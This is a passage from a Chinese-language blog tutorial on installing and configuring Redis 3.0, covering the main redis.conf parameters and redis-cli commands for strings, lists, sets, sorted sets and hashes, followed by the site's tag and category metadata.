主从（借助于sentinel实现一定意义上的HA） Clustering（分布式存储） 数据机构服务器：支持存储string、list、hash、set、Sorted Set，Bitmap，HyperLoglogs 能够作为队列使用 备注：redis是单线程，但是这并不意味着会成为运行时的瓶颈，每秒能够支撑50W的并发 哪些公司在使用 Twitter pinterest tumblr github stack overflow digg blizard flickr weibo 数据库存储系统分类常见的数据库系统有以下几类： RDBMS：Oracle、DB2、Mysql NoSQL：MongoDB、Redis、HBase、Memcached NewSQL：Aerospike、FounddtionDB、RethinkDB 而NoSQL又分为以下几类： Key-Value NoSql：Memcached、Redis Column family NoSQL:Cassandra、HBase Documentation NoSQL：MongoDB Graph NoSQL：Neo4j Redis 3.0 2015年4月1日正式推出，它的特性： redis cluster 新的”embedded string” LRU演算法的改进：预设随机取5个样本，插入并排序至一个pool。移除最佳者，如此反复，直到内存用量小于maxmemory的设定。 Redis的组件最早只有1W行代码，网址是[http://www.redis.io][2]，它的组件有： redis-server redis-cli redis-benchmark（压测工具） redis-check-dump &amp;&amp; redis-check-aof 能够去检测文件是否损坏两种格式RDB/AOF格式 redis的安装redis的安装是非常简单的，你甚至都不需要去configure，直接make &amp;&amp; makeinstall make也不需要带过多的参数。 官网： 编译 wget -c http://download.redis.io/releases/redis-3.0.6.tar.gz tar xvf redis-version.tar.gz cd redis-version make &amp;&amp; make install &gt; 注意：安装需要编译环境，例如gcc等必要工具的支持2.提示缺少tcl，可以通过yum install tcl去安装 [root@redis redis-3.0.6]# make test cd src &amp;&amp; make test make[1]: Entering directory `/root/redis-3.0.6/src&apos; You need tcl 8.5 or newer in order to run the Redis test make[1]: *** [test] Error 1 make[1]: Leaving directory `/root/redis-3.0.6/src&apos; make: *** [test] Error 23.解决错误之后，我们就可以通过redis-server redis.conf去启动redis服务端了 [root@redis redis-3.0.6]# redis-server redis.conf 4624:M 20 Dec 11:56:53.375 * Increased maximum number of open files to 10032 (it was originally set to 1024). _._ _.-``__ &apos;&apos;-._ _.-`` `. `_. &apos;&apos;-._ Redis 3.0.6 (00000000/0) 64 bit .-`` .-```. ```\\/ _.,_ &apos;&apos;-._ ( &apos; , .-` | `, ) Running in standalone mode |`-._`-...-` __...-.``-._|&apos;` _.-&apos;| Port: 6379 | `-._ `._ / _.-&apos; | PID: 4624 `-._ `-._ `-./ _.-&apos; _.-&apos; |`-._`-._ `-.__.-&apos; _.-&apos;_.-&apos;| | `-._`-._ _.-&apos;_.-&apos; | http://redis.io `-._ `-._`-.__.-&apos;_.-&apos; _.-&apos; |`-._`-._ `-.__.-&apos; _.-&apos;_.-&apos;| | `-._`-._ _.-&apos;_.-&apos; | `-._ `-._`-.__.-&apos;_.-&apos; _.-&apos; `-._ `-.__.-&apos; _.-&apos; `-._ _.-&apos; `-.__.-&apos; 4624:M 20 Dec 11:56:53.376 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128. 4624:M 20 Dec 11:56:53.376 # Server started, Redis version 3.0.6 4624:M 20 Dec 11:56:53.376 # WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add &apos;vm.overcommit_memory = 1&apos; to /etc/sysctl.conf and then reboot or run the command &apos;sysctl vm.overcommit_memory=1&apos; for this to take effect. 4624:M 20 Dec 11:56:53.376 # WARNING you have Transparent Huge Pages (THP) support enabled in your kernel. This will create latency and memory usage issues with Redis. To fix this issue run the command &apos;echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled&apos; as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. Redis must be restarted after THP is disabled. 4624:M 20 Dec 11:56:53.376 * The server is now ready to accept connections on port 6379从上面的输出信息中，我们看到redis是运行在TCP的6379端口上的。 注意：默认的redis.conf文件的daemonize参数为no，所以redis不会在后台运行，这时要测试，我们需要重新开一个终端。修改为yes则为&gt;后台运行redis。另外配置文件中规定了pid文件，log文件和数据文件的地址，如果有需要先修改，默认log信息定向到stdout 4.redis的配置文件 redis.conf的主要配置参数的含义： daemonize：是否以后台daemon方式运行，no为禁止，yes为运行 pidfile：pid文件位置 tcp-backlog（如果访问量非常大，接收缓冲已经满了，制定一个位置缓冲新请求，tcp协议一般会有backlog） bind 监听地址，默认在127.0.0.1 我们可以指定多个地址，例如bind 127.0.0.1 10.0.1.243 port：监听的端口号，默认是6379，可以自己指定其他地址 unixsocket和unixsocketperm 定义sokcet的pid文件位置和权限如果你的服务器和redis在同一台服务器上推荐指定socket方式，给予socket的方式在内存中直接交换而不经过tcp协议栈去封装， timeout：请求超时时间，0表示禁用 loglevel：log信息级别 logfile：log文件位置 databases：开启数据库的数量，在redis的集群中只支持0库 save * ：保存快照的频率，第一个表示多长时间，第三个*表示执行多少次写操作。在一定时间内执行一定数量的写操作时，自动保存快照。可设置多个条件，例如以下，表示900秒有1个键发生变化就执行写操作，如果在300秒内，有10个键发生变化就执行写操作，如果60秒有1000个键发生变化则执行写操作。 save 900 1 save 300 10 save 60 10000 rdbcompression：是否使用压缩 dbfilename：数据快照文件名（只是文件名，不包括目录） dir：数据快照的保存目录（这个是目录） appendonly：是否开启appendonlylog，开启的话每次写操作会记一条log，这会提高数据抗风险能力，但影响效率。 appendfsync：appendonlylog如何同步到磁盘（三个选项，分别是每次写都强制调用fsync、每秒启用一次fsync、不调用fsync等待系统自己同步） slaveof， 启动主从，需要指定iP和端口 使用redis客户端1.我们修改redis的配置文件，将daemonize修改为yes,将bind打开，然后保存，执行如下操作 [root@redis redis-3.0.6]# redis-server /etc/redis.conf [root@redis redis-3.0.6]# redis-cli 127.0.0.1:6379&gt; 注意:默认redis-cli没有开启认证机制，所以直接redis-cli就可以进入redis命令行界面 2.redis的帮助系统，我们进入cli后，可以输入help查看帮助信息 127.0.0.1:6379&gt; help redis-cli 3.0.6 Type: &quot;help @&lt;group&gt;&quot; to get a list of commands in &lt;group&gt; &quot;help &lt;command&gt;&quot; for help on &lt;command&gt; &quot;help &lt;tab&gt;&quot; to get a list of possible help topics &quot;quit&quot; to exit例如我们要查看String的相关参数可以使用help @String 127.0.0.1:6379&gt; help @String APPEND key value summary: Append a value to a key since: 2.0.0 BITCOUNT key [start end] summary: Count set bits in a string since: 2.6.0 ……我们也可以使用help [tab]去tab一些选项 redis的常用命令Strings的命1.打开数据库(名称空间)：SELE [num],最多打开16个 127.0.0.1:6379&gt; SELECT 1 OK 127.0.0.1:6379[1]&gt; SELECT 2 OK2.设置字符串 127.0.0.1:6379&gt; help set SET key value [EX seconds] [PX milliseconds] [NX|XX] summary: Set the string value of a key since: 1.0.0 group: string3.设置key和value 127.0.0.1:6379&gt; SET disto fedora OK 127.0.0.1:6379&gt; GET disto &quot;fedora&quot;4.键值在同一名称空间中必须唯一 127.0.0.1:6379&gt; SET disto fedora OK 127.0.0.1:6379&gt; GET disto &quot;fedora&quot; 127.0.0.1:6379&gt; SET disto ubuntu OK 127.0.0.1:6379&gt; GET disto &quot;ubuntu&quot; 127.0.0.1:6379&gt; 5.设置自动增长的值 127.0.0.1:6379&gt; SET count 0 OK 127.0.0.1:6379&gt; INCR count (integer) 1 127.0.0.1:6379&gt; INCR count (integer) 2 127.0.0.1:6379&gt; INCR count (integer) 36.设置自动减的值 127.0.0.1:6379&gt; DECR count (integer) 2 127.0.0.1:6379&gt; DECR count (integer) 1 127.0.0.1:6379&gt; DECR count (integer) 0 127.0.0.1:6379&gt; DECR count (integer) -1 127.0.0.1:6379&gt; DECR count (integer) -27.设置键的手动过期或自动过期时间 SET key value [EX seconds] [PX milliseconds] [NX|XX]EX 过期时间 NX 如果一个键不存在才创建 127.0.0.1:6379&gt; SET disto gento NX (nil)XX表示存在才创建 127.0.0.1:6379&gt; SET foo bar XX (nil)8.set还支持integer，但是必须为整数 1）设置integer 127.0.0.1:6379&gt; set foo 1 OK 127.0.0.1:6379&gt; get foo &quot;1&quot;2）非integer会出现错误 127.0.0.1:6379&gt; set foo bar OK 127.0.0.1:6379&gt; incr foo (error) ERR value is not an integer or out of rangeList的常用命令1.获取list的帮助 127.0.0.1:6379&gt; help @list BLPOP key [key ...] timeout summary: Remove and get the first element in a list, or block until one is available since: 2.0.0 BRPOP key [key ...] timeout summary: Remove and get the last element in a list, or block until one is available since: 2.0.0 BRPOPLPUSH source destination timeout summary: Pop a value from a list, push it to another list and return it; or block until one is available since: 2.2.02.定义一个list 127.0.0.1:6379&gt; LPUSH l1 mon (integer) 13.获取list的值 127.0.0.1:6379&gt; LINDEX l1 0 &quot;mon&quot; 127.0.0.1:6379&gt;比如我们在给l1增加一个值 127.0.0.1:6379&gt; LPUSH l1 sun (integer) 2那么，此时，我们通过LINDEX l1 0获取的就是新增加的sun，而LINDEX l1 1则是mon 127.0.0.1:6379&gt; LINDEX l1 0 &quot;sun&quot; 127.0.0.1:6379&gt; LINDEX l1 1 &quot;mon&quot;那么，我们要想从右侧增加一个值呢？我们可以使用RPUSH去创建 127.0.0.1:6379&gt; RPUSH l1 tue (integer) 3 127.0.0.1:6379&gt; LINDEX l1 2 &quot;tue&quot;修改一个值 127.0.0.1:6379&gt; LSET l1 1 fri OK 127.0.0.1:6379&gt; LINDEX l1 1 &quot;fri&quot;要想从左侧弹出一个值用LPOP,要想从右侧则用RPOP 127.0.0.1:6379&gt; RPOP l1 &quot;tue&quot; 127.0.0.1:6379&gt; RPOP l1 &quot;fri&quot;无序集合的操作1.创建一个集合 127.0.0.1:6379&gt; SADD w1 mon tue wed thu fre sat sun (integer) 7 127.0.0.1:6379&gt; SADD w2 tue thu day (integer) 32.求交集 127.0.0.1:6379&gt; SINTER w1 w2 1) &quot;thu&quot; 2) &quot;tue&quot; 127.0.0.1:6379&gt; 2.求并集 127.0.0.1:6379&gt; SUNION w1 w2 1) &quot;thu&quot; 2) &quot;day&quot; 3) &quot;sun&quot; 4) &quot;tue&quot; 5) &quot;fre&quot; 6) &quot;wed&quot; 7) &quot;mon&quot; 8) &quot;sat&quot; 127.0.0.1:6379&gt; 3.弹出元素 127.0.0.1:6379&gt; SPOP w1 &quot;sun&quot;5.查看元素是否存在 127.0.0.1:6379&gt; SISMEMBER w1 mon (integer) 1 127.0.0.1:6379&gt; SISMEMBER w1 fri (integer) 0有序集合操作127.0.0.1:6379&gt; HELP @SORTED_SET1.添加元素到集合 127.0.0.1:6379&gt; ZADD weekday1 1 mon 2 tue 3 wed (integer) 32.获取元素的总数 127.0.0.1:6379&gt; ZCARD weekday1 (integer) 33.查看索引号 127.0.0.1:6379&gt; ZRANK weekday1 tue (integer) 14.根据元素获取SCORE 127.0.0.1:6379&gt; ZSCORE weekday1 mon &quot;1&quot;5.指明索引范围获取值 127.0.0.1:6379&gt; ZRANGE weekday1 0 2 1) &quot;mon&quot; 2) &quot;tue&quot; 3) &quot;wed&quot;Hashes的操作1.添加/补充新值一个hashes 127.0.0.1:6379&gt; HSET h1 a mon (integer) 12.获取值 127.0.0.1:6379&gt; HGET h1 a &quot;mon&quot;3.获取所有值 127.0.0.1:6379&gt; HKEYS h1 1) &quot;a&quot; 2) &quot;b&quot;4.获取元素总数 127.0.0.1:6379&gt; HLEN h1 (integer) 25.删除键 127.0.0.1:6379&gt; HDEL h1 a (integer) 1 127.0.0.1:6379&gt; HGET h1 a (nil)","categories":[],"tags":[{"name":"redis","slug":"redis","permalink":"https://awen.me/tags/redis/"}]}],"categories":[{"name":"有赞云","slug":"有赞云","permalink":"https://awen.me/categories/%E6%9C%89%E8%B5%9E%E4%BA%91/"},{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://awen.me/categories/SpringBoot/"},{"name":"Mybatis","slug":"Mybatis","permalink":"https://awen.me/categories/Mybatis/"},{"name":"Spring","slug":"Spring","permalink":"https://awen.me/categories/Spring/"},{"name":"随笔","slug":"随笔","permalink":"https://awen.me/categories/%E9%9A%8F%E7%AC%94/"},{"name":"GitHub","slug":"GitHub","permalink":"https://awen.me/categories/GitHub/"},{"name":"Java","slug":"Java","permalink":"https://awen.me/categories/Java/"},{"name":"云计算","slug":"云计算","permalink":"https://awen.me/categories/%E4%BA%91%E8%AE%A1%E7%AE%97/"},{"name":"监控","slug":"监控","permalink":"https://awen.me/categories/%E7%9B%91%E6%8E%A7/"},{"name":"直播","slug":"直播","permalink":"https://awen.me/categories/%E7%9B%B4%E6%92%AD/"},{"name":"运维","slug":"运维","permalink":"https://awen.me/categories/%E8%BF%90%E7%BB%B4/"},{"name":"redis","slug":"redis","permalink":"https://awen.me/categories/redis/"},{"name":"hexo","slug":"hexo","permalink":"https://awen.me/categories/hexo/"},{"name":"kubernetes","slug":"kubernetes","permalink":"https://awen.me/categories/kubernetes/"},{"name":"HTTP","slug":"HTTP","permalink":"https://awen.me/categories/HTTP/"},{"name":"区块链","slug":"区块链","permalink":"https://awen.me/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"}],"tags":[{"name":"有赞云","slug":"有赞云","permalink":"https://awen.me/tags/%E6%9C%89%E8%B5%9E%E4%BA%91/"},{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://awen.me/tags/SpringBoot/"},{"name":"Mybatis","slug":"Mybatis","permalink":"https://awen.me/tags/Mybatis/"},{"name":"Spring","slug":"Spring","permalink":"https://awen.me/tags/Spring/"},{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"},{"name":"GitHub","slug":"GitHub","permalink":"https://awen.me/tags/GitHub/"},{"name":"spring","slug":"spring","permalink":"https://awen.me/tags/spring/"},{"name":"云计算","slug":"云计算","permalink":"https://awen.me/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"},{"name":"Prometheus","slug":"Prometheus","permalink":"https://awen.me/tags/Prometheus/"},{"name":"直播","slug":"直播","permalink":"https://awen.me/tags/%E7%9B%B4%E6%92%AD/"},{"name":"运维","slug":"运维","permalink":"https://awen.me/tags/%E8%BF%90%E7%BB%B4/"},{"name":"运维 云计算","slug":"运维-云计算","permalink":"https://awen.me/tags/%E8%BF%90%E7%BB%B4-%E4%BA%91%E8%AE%A1%E7%AE%97/"},{"name":"redis","slug":"redis","permalink":"https://awen.me/tags/redis/"},{"name":"hexo","slug":"hexo","permalink":"https://awen.me/tags/hexo/"},{"name":"kubernetes","slug":"kubernetes","permalink":"https://awen.me/tags/kubernetes/"},{"name":"HTTP","slug":"HTTP","permalink":"https://awen.me/tags/HTTP/"},{"name":"HTTP3","slug":"HTTP3","permalink":"https://awen.me/tags/HTTP3/"},{"name":"QUIC","slug":"QUIC","permalink":"https://awen.me/tags/QUIC/"},{"name":"区块链","slug":"区块链","permalink":"https://awen.me/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"科技资讯","slug":"科技资讯","permalink":"https://awen.me/tags/%E7%A7%91%E6%8A%80%E8%B5%84%E8%AE%AF/"},{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"},{"name":"公有云","slug":"公有云","permalink":"https://awen.me/tags/%E5%85%AC%E6%9C%89%E4%BA%91/"},{"name":"读书笔记","slug":"读书笔记","permalink":"https://awen.me/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"1password","slug":"1password","permalink":"https://awen.me/tags/1password/"},{"name":"mysql","slug":"mysql","permalink":"https://awen.me/tags/mysql/"},{"name":"Mac","slug":"Mac","permalink":"https://awen.me/tags/Mac/"},{"name":"tomcat","slug":"tomcat","permalink":"https://awen.me/tags/tomcat/"},{"name":"windows","slug":"windows","permalink":"https://awen.me/tags/windows/"},{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"},{"name":"dns","slug":"dns","permalink":"https://awen.me/tags/dns/"},{"name":"https","slug":"https","permalink":"https://awen.me/tags/https/"},{"name":"科技","slug":"科技","permalink":"https://awen.me/tags/%E7%A7%91%E6%8A%80/"},{"name":"理财","slug":"理财","permalink":"https://awen.me/tags/%E7%90%86%E8%B4%A2/"},{"name":"docker","slug":"docker","permalink":"https://awen.me/tags/docker/"},{"name":"Python","slug":"Python","permalink":"https://awen.me/tags/Python/"},{"name":"http3","slug":"http3","permalink":"https://awen.me/tags/http3/"},{"name":"nginx","slug":"nginx","permalink":"https://awen.me/tags/nginx/"},{"name":"mac","slug":"mac","permalink":"https://awen.me/tags/mac/"},{"name":"webp","slug":"webp","permalink":"https://awen.me/tags/webp/"},{"name":"openstack","slug":"openstack","permalink":"https://awen.me/tags/openstack/"},{"name":"路由","slug":"路由","permalink":"https://awen.me/tags/%E8%B7%AF%E7%94%B1/"},{"name":"git","slug":"git","permalink":"https://awen.me/tags/git/"},{"name":"Windows","slug":"Windows","permalink":"https://awen.me/tags/Windows/"},{"name":"jenkins","slug":"jenkins","permalink":"https://awen.me/tags/jenkins/"},{"name":"PHP","slug":"PHP","permalink":"https://awen.me/tags/PHP/"},{"name":"postman","slug":"postman","permalink":"https://awen.me/tags/postman/"},{"name":"python3","slug":"python3","permalink":"https://awen.me/tags/python3/"},{"name":"go","slug":"go","permalink":"https://awen.me/tags/go/"},{"name":"kafka","slug":"kafka","permalink":"https://awen.me/tags/kafka/"},{"name":"Java","slug":"Java","permalink":"https://awen.me/tags/Java/"},{"name":"生活","slug":"生活","permalink":"https://awen.me/tags/%E7%94%9F%E6%B4%BB/"},{"name":"OpenStack","slug":"OpenStack","permalink":"https://awen.me/tags/OpenStack/"},{"name":"memcached","slug":"memcached","permalink":"https://awen.me/tags/memcached/"},{"name":"mitmproxy","slug":"mitmproxy","permalink":"https://awen.me/tags/mitmproxy/"},{"name":"离职","slug":"离职","permalink":"https://awen.me/tags/%E7%A6%BB%E8%81%8C/"},{"name":"rabbitmq","slug":"rabbitmq","permalink":"https://awen.me/tags/rabbitmq/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://awen.me/tags/elasticsearch/"},{"name":"awk","slug":"awk","permalink":"https://awen.me/tags/awk/"},{"name":"域名","slug":"域名","permalink":"https://awen.me/tags/%E5%9F%9F%E5%90%8D/"},{"name":"ssl","slug":"ssl","permalink":"https://awen.me/tags/ssl/"},{"name":"SSL 证书","slug":"SSL-证书","permalink":"https://awen.me/tags/SSL-%E8%AF%81%E4%B9%A6/"},{"name":"k8s","slug":"k8s","permalink":"https://awen.me/tags/k8s/"},{"name":"java","slug":"java","permalink":"https://awen.me/tags/java/"},{"name":"icloud","slug":"icloud","permalink":"https://awen.me/tags/icloud/"},{"name":"微信","slug":"微信","permalink":"https://awen.me/tags/%E5%BE%AE%E4%BF%A1/"},{"name":"surge","slug":"surge","permalink":"https://awen.me/tags/surge/"},{"name":"ssh","slug":"ssh","permalink":"https://awen.me/tags/ssh/"},{"name":"masscan","slug":"masscan","permalink":"https://awen.me/tags/masscan/"},{"name":"zsh","slug":"zsh","permalink":"https://awen.me/tags/zsh/"},{"name":"mongodb","slug":"mongodb","permalink":"https://awen.me/tags/mongodb/"},{"name":"netease","slug":"netease","permalink":"https://awen.me/tags/netease/"},{"name":"工具","slug":"工具","permalink":"https://awen.me/tags/%E5%B7%A5%E5%85%B7/"},{"name":"mac 小技巧","slug":"mac-小技巧","permalink":"https://awen.me/tags/mac-%E5%B0%8F%E6%8A%80%E5%B7%A7/"},{"name":"小工具","slug":"小工具","permalink":"https://awen.me/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/"},{"name":"chrome","slug":"chrome","permalink":"https://awen.me/tags/chrome/"},{"name":"日常","slug":"日常","permalink":"https://awen.me/tags/%E6%97%A5%E5%B8%B8/"},{"name":"软件","slug":"软件","permalink":"https://awen.me/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"域名解析","slug":"域名解析","permalink":"https://awen.me/tags/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/"},{"name":"mac小技巧","slug":"mac小技巧","permalink":"https://awen.me/tags/mac%E5%B0%8F%E6%8A%80%E5%B7%A7/"},{"name":"openssl","slug":"openssl","permalink":"https://awen.me/tags/openssl/"},{"name":"ipv6","slug":"ipv6","permalink":"https://awen.me/tags/ipv6/"},{"name":"Dropbox","slug":"Dropbox","permalink":"https://awen.me/tags/Dropbox/"},{"name":"网络","slug":"网络","permalink":"https://awen.me/tags/%E7%BD%91%E7%BB%9C/"},{"name":"又拍云","slug":"又拍云","permalink":"https://awen.me/tags/%E5%8F%88%E6%8B%8D%E4%BA%91/"},{"name":"搜狗","slug":"搜狗","permalink":"https://awen.me/tags/%E6%90%9C%E7%8B%97/"},{"name":"DNS","slug":"DNS","permalink":"https://awen.me/tags/DNS/"},{"name":"缓存","slug":"缓存","permalink":"https://awen.me/tags/%E7%BC%93%E5%AD%98/"},{"name":"sign","slug":"sign","permalink":"https://awen.me/tags/sign/"},{"name":"HTTPS","slug":"HTTPS","permalink":"https://awen.me/tags/HTTPS/"},{"name":"抓包","slug":"抓包","permalink":"https://awen.me/tags/%E6%8A%93%E5%8C%85/"},{"name":"email","slug":"email","permalink":"https://awen.me/tags/email/"},{"name":"杭州","slug":"杭州","permalink":"https://awen.me/tags/%E6%9D%AD%E5%B7%9E/"},{"name":"网盘","slug":"网盘","permalink":"https://awen.me/tags/%E7%BD%91%E7%9B%98/"},{"name":"股票","slug":"股票","permalink":"https://awen.me/tags/%E8%82%A1%E7%A5%A8/"},{"name":"fish","slug":"fish","permalink":"https://awen.me/tags/fish/"},{"name":"鼠须管","slug":"鼠须管","permalink":"https://awen.me/tags/%E9%BC%A0%E9%A1%BB%E7%AE%A1/"},{"name":"mariadb","slug":"mariadb","permalink":"https://awen.me/tags/mariadb/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://awen.me/tags/Ubuntu/"},{"name":"网易","slug":"网易","permalink":"https://awen.me/tags/%E7%BD%91%E6%98%93/"},{"name":"心得","slug":"心得","permalink":"https://awen.me/tags/%E5%BF%83%E5%BE%97/"},{"name":"阿里云","slug":"阿里云","permalink":"https://awen.me/tags/%E9%98%BF%E9%87%8C%E4%BA%91/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://awen.me/tags/JavaScript/"},{"name":"CDN","slug":"CDN","permalink":"https://awen.me/tags/CDN/"},{"name":"SSH","slug":"SSH","permalink":"https://awen.me/tags/SSH/"},{"name":"监控","slug":"监控","permalink":"https://awen.me/tags/%E7%9B%91%E6%8E%A7/"},{"name":"ansible","slug":"ansible","permalink":"https://awen.me/tags/ansible/"},{"name":"markdown","slug":"markdown","permalink":"https://awen.me/tags/markdown/"},{"name":"firewalld","slug":"firewalld","permalink":"https://awen.me/tags/firewalld/"},{"name":"ladp","slug":"ladp","permalink":"https://awen.me/tags/ladp/"},{"name":"hosts","slug":"hosts","permalink":"https://awen.me/tags/hosts/"},{"name":"shell","slug":"shell","permalink":"https://awen.me/tags/shell/"},{"name":"劫持","slug":"劫持","permalink":"https://awen.me/tags/%E5%8A%AB%E6%8C%81/"},{"name":"ffmpeg","slug":"ffmpeg","permalink":"https://awen.me/tags/ffmpeg/"},{"name":"rewrite","slug":"rewrite","permalink":"https://awen.me/tags/rewrite/"},{"name":"aws","slug":"aws","permalink":"https://awen.me/tags/aws/"},{"name":"ats","slug":"ats","permalink":"https://awen.me/tags/ats/"},{"name":"rtmp","slug":"rtmp","permalink":"https://awen.me/tags/rtmp/"},{"name":"HLS","slug":"HLS","permalink":"https://awen.me/tags/HLS/"},{"name":"discuz","slug":"discuz","permalink":"https://awen.me/tags/discuz/"},{"name":"google","slug":"google","permalink":"https://awen.me/tags/google/"},{"name":"mac，快捷键","slug":"mac，快捷键","permalink":"https://awen.me/tags/mac%EF%BC%8C%E5%BF%AB%E6%8D%B7%E9%94%AE/"},{"name":"http","slug":"http","permalink":"https://awen.me/tags/http/"},{"name":"Cisco","slug":"Cisco","permalink":"https://awen.me/tags/Cisco/"},{"name":"gns3","slug":"gns3","permalink":"https://awen.me/tags/gns3/"},{"name":"路由交换","slug":"路由交换","permalink":"https://awen.me/tags/%E8%B7%AF%E7%94%B1%E4%BA%A4%E6%8D%A2/"},{"name":"mac技巧","slug":"mac技巧","permalink":"https://awen.me/tags/mac%E6%8A%80%E5%B7%A7/"},{"name":"tcpdump","slug":"tcpdump","permalink":"https://awen.me/tags/tcpdump/"},{"name":"ffplay","slug":"ffplay","permalink":"https://awen.me/tags/ffplay/"},{"name":"iptables","slug":"iptables","permalink":"https://awen.me/tags/iptables/"},{"name":"autofs","slug":"autofs","permalink":"https://awen.me/tags/autofs/"},{"name":"bond","slug":"bond","permalink":"https://awen.me/tags/bond/"},{"name":"链路聚合","slug":"链路聚合","permalink":"https://awen.me/tags/%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88/"},{"name":"samba","slug":"samba","permalink":"https://awen.me/tags/samba/"},{"name":"ftp","slug":"ftp","permalink":"https://awen.me/tags/ftp/"},{"name":"虚拟化","slug":"虚拟化","permalink":"https://awen.me/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"},{"name":"kvm","slug":"kvm","permalink":"https://awen.me/tags/kvm/"},{"name":"KVM","slug":"KVM","permalink":"https://awen.me/tags/KVM/"},{"name":"内存管理","slug":"内存管理","permalink":"https://awen.me/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"},{"name":"tcp","slug":"tcp","permalink":"https://awen.me/tags/tcp/"},{"name":"vim","slug":"vim","permalink":"https://awen.me/tags/vim/"},{"name":"lvs","slug":"lvs","permalink":"https://awen.me/tags/lvs/"},{"name":"负载均衡","slug":"负载均衡","permalink":"https://awen.me/tags/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"},{"name":"自动化运维","slug":"自动化运维","permalink":"https://awen.me/tags/%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%90%E7%BB%B4/"},{"name":"wireshark","slug":"wireshark","permalink":"https://awen.me/tags/wireshark/"},{"name":"kernel","slug":"kernel","permalink":"https://awen.me/tags/kernel/"},{"name":"frp","slug":"frp","permalink":"https://awen.me/tags/frp/"},{"name":"srs","slug":"srs","permalink":"https://awen.me/tags/srs/"},{"name":"osx","slug":"osx","permalink":"https://awen.me/tags/osx/"},{"name":"VRRP","slug":"VRRP","permalink":"https://awen.me/tags/VRRP/"},{"name":"攻击","slug":"攻击","permalink":"https://awen.me/tags/%E6%94%BB%E5%87%BB/"},{"name":"LDAP","slug":"LDAP","permalink":"https://awen.me/tags/LDAP/"},{"name":"NFS","slug":"NFS","permalink":"https://awen.me/tags/NFS/"},{"name":"视频录制","slug":"视频录制","permalink":"https://awen.me/tags/%E8%A7%86%E9%A2%91%E5%BD%95%E5%88%B6/"},{"name":"RHCE","slug":"RHCE","permalink":"https://awen.me/tags/RHCE/"},{"name":"正则","slug":"正则","permalink":"https://awen.me/tags/%E6%AD%A3%E5%88%99/"},{"name":"itchat","slug":"itchat","permalink":"https://awen.me/tags/itchat/"},{"name":"Linux","slug":"Linux","permalink":"https://awen.me/tags/Linux/"},{"name":"php","slug":"php","permalink":"https://awen.me/tags/php/"}]}